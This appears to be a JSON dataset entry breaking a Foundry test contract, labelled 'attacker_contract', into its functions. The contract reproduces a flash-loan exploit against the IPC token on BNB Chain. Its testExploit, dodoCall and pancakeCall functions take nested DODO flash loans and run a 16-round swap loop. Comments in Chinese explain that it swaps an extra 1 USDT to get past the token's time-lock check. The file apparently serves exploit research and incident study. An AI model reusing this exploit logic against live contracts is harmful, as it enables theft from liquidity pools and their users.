[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        dodoCall(sender, baseAmount, quoteAmount, data);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "DVMFlashLoanCall",
    "original_code": "    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        dodoCall(sender, baseAmount, quoteAmount, data);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "dodoCall",
    "original_code": "    function dodoCall(address a, uint256 b, uint256 c, bytes memory d) public {\n        console.log(msg.sender);\n        if(msg.sender == address(dvm1)){\n            (bool success,) = dvm2.call(abi.encodeWithSignature(\"flashLoan(uint256,uint256,address,bytes)\", 0, borrow_2, address(this), \"1\"));\n            require(success, \"flashloan failed\");\n            USDT.transfer(address(dvm1), borrow_1);\n        }\n\n        if(msg.sender == address(dvm2)){\n            console.log(\"Pair balance\",IPC.balanceOf(address(pair)));\n            console.log(\"USDT balance\",USDT.balanceOf(address(this)));\n            \n            address[] memory path = new address[](2);\n\n            \n            for(uint i = 0; i < 16; i++) {\n                path[0] = address(USDT);\n                path[1] = address(IPC);\n                uint256 usdtAmount = USDT.balanceOf(address(this)) - 10;\n                uint256[] memory values = router.getAmountsOut(usdtAmount, path);\n\n                //\u4e3a\u4e86\u7ed5\u8fc7\u65f6\u95f4\u9501\u7684\u68c0\u67e5\uff0c\u540c\u6b65\u63621 usdt\u51fa\u6765\n                pair.swap(1, values[1], address(this), abi.encode(usdtAmount));\n\n                // \u5c06IPC\u5168\u90e8\u6362\u6210USDT\n                IPC.approve(address(router), type(uint256).max);\n                path[0] = address(IPC); \n                path[1] = address(USDT);\n                router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n                    IPC.balanceOf(address(this)),\n                    0,\n                    path,\n                    address(this),\n                    block.timestamp\n                );\n                \n                path[0] = address(USDT);\n                path[1] = address(IPC);\n            }\n\n            \n            USDT.transfer(address(dvm2), borrow_2);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address, uint256, uint256 amount1, bytes memory data) public {\n        uint256 usdt_amount = abi.decode(data, (uint256));\n        console.log(\"USDT transferd\",usdt_amount);\n        //\u591a\u6362\u4e861 usdt\uff0c\u6240\u4ee5\u591a\u8fd81\u4e2a\n        USDT.transfer(address(pair), usdt_amount+1);\n    }\n        \n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() external {\n        cheats.createSelectFork(\"bsc\", 45561316 - 1);\n        // attacker buy sor\n        deal(address(this),0);\n        deal(address(USDT),address(this),0);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        emit log_named_decimal_uint(\"[Begin] USDT balance before\", USDT.balanceOf(address(this)), 18);\n        \n\n        (bool success,) = dvm1.call(abi.encodeWithSignature(\"flashLoan(uint256,uint256,address,bytes)\", 0, borrow_1, address(this), \"1\"));\n        require(success, \"flashloan failed\");\n\n        emit log_named_decimal_uint(\"[End] USDT balance after\", USDT.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  }
]